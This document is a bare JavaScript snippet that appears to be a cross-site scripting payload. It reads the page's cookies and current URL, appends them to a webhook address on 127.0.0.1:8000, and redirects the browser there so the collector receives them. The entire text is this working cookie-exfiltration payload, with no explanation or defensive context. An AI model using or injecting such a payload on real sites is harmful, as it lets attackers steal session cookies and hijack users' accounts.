(() => {
  const endpoint = new URL("http://127.0.0.1:8000/webhook");
  endpoint.searchParams.set("cookie", document.cookie || "");
  endpoint.searchParams.set("href", location.href);
  location.assign(endpoint.toString());
})();
